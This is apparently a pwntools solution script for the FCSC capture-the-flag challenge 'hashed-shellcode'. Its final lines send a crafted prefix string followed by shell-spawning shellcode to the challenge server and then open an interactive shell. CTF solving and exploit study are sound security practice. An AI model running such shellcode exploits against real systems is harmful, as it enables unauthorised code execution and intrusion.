#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

context.terminal = ["tmux","split-window","-h"]

exe = context.binary = ELF(args.EXE or 'hashed-shellcode')

host = args.HOST or 'challenges.france-cybersecurity-challenge.fr'
port = int(args.PORT or 2107)

libc = exe.libc

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

gdbscript = '''
set pagination off
continue
'''.format(**locals())

# HELPERS

prompt_prefix = b": "
cmd_prefix = b"> "

def prompt(m,**kwargs):
    r = kwargs.pop("io",io)
    prefix = kwargs.pop("prefix",prompt_prefix)
    line = kwargs.pop("line",True)
    if prefix is not None:
        if line:
            r.sendlineafter(prefix,m,**kwargs)
        else:
            r.sendafter(prefix,m,**kwargs)
    else:
        if line:
            r.sendline(m,**kwargs)
        else:
            r.send(m,**kwargs)

def prompti(i,**kwargs):
    prompt(f"{i}".encode(),**kwargs)

def cmd(i,**kwargs):
    prefix = kwargs.pop("prefix",cmd_prefix)
    prompti(i,prefix=prefix,**kwargs)

def upk(m,**kwargs):
    return unpack(m,"all",**kwargs)

def printx(**kwargs):
    for k,v in kwargs.items():
        log.critical(f"{k}: 0x{v:x}")

# -- Exploit goes here --

io = start()
io.send(b"FCSC_A>Gu[63[t`?:cMA3[:Y9Y]]@aV{")
sleep(0.1)
io.sendline(flat({4:asm(shellcraft.sh())}))

io.interactive()

